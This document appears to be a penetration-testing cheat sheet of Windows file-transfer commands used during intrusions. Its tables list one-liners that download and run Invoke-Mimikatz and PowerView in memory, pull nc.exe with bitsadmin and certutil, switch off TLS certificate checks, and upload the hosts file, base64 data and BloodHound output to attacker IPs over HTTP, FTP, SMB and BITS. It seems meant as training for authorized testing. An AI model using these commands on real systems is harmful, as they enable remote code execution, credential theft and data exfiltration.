# Transferring Files

| Command                                                                                    | Description                                                                                                           |
| ------------------------------------------------------------------------------------------ | --------------------------------------------------------------------------------------------------------------------- |
| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                    | Download a file with PowerShell                                                                                       |
| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`      | Execute a file in memory using PowerShell                                                                             |
| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                    | Upload a file with PowerShell                                                                                         |
| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                           | Download a file using Bitsadmin                                                                                       |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                              | Download a file using Certutil                                                                                        |
| `[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("TODO="))` | Transfer file using base64 encoding (Windows decoding)                                                                |
| `[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}`          | Bypass “The underlying connection was closed: Could not establish trust relationship for the SSL/TLS secure channel." |

| `Invoke-WebRequest https://<ip>/PowerView.ps1 -UseBasicParsing \| IEX`                                             | Bypass IE Restriction                           |
| ------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------- |
| `sudo impacket-smbserver share -smb2support share dir -user test -password test`                                   | Create SMB Server with a Username and Password  |
| `move file.dmp \\10.10.10.10\share\file.dmp`                                                                       |                                                 |
| `net use n: \\192.168.220.133\share /user:test test`                                                               | Mount the SMB Server with Username and Password |
| `[Convert]::ToBase64String((Get-Content -path "C:\Windows\system32\drivers\etc\hosts" -Encoding byte))`            | Powershell base64 encode                        |
| `sudo python3 -m pyftpdlib --port 21 --write`                                                                      | Mount FTP                                       |
| `(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')` | PowerShell Upload File To FTP                   |

| `Test-NetConnection -ComputerName DATABASE01 -Port 5985`                                               | Test WinRM                                                       |
| ------------------------------------------------------------------------------------------------------ | ---------------------------------------------------------------- |
| `$Session = New-PSSession -ComputerName DATABASE01`                                                    | Create a PowerShell Remoting Session to DATABASE01               |
| `Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\`   | Copy samplefile.txt from our Localhost to the DATABASE01 Session |
| `Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session` | Copy DATABASE.txt from DATABASE01 Session to our Localhost       |

| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\Temp\nc.exe`                                                                                                                                                 | File Transfert Using Bits     |
| ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ----------------------------- |
| `Import-Module bitstransfer; Start-BitsTransfer -Source "http://10.10.10.32/nc.exe" -Destination "C:\Temp\nc.exe"`                                                                                               | File Transfert Using Bits     |
| `Start-BitsTransfer "C:\Temp\bloodhound.zip" -Destination "http://10.10.10.132/uploads/bloodhound.zip" -TransferType Upload -ProxyUsage Override -ProxyList PROXY01:8080 -ProxyCredential INLANEFREIGHT\svc-sql` | File Transfert Using Bits     |
| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                                                                                                                    | File Transfert Using CertUtil |
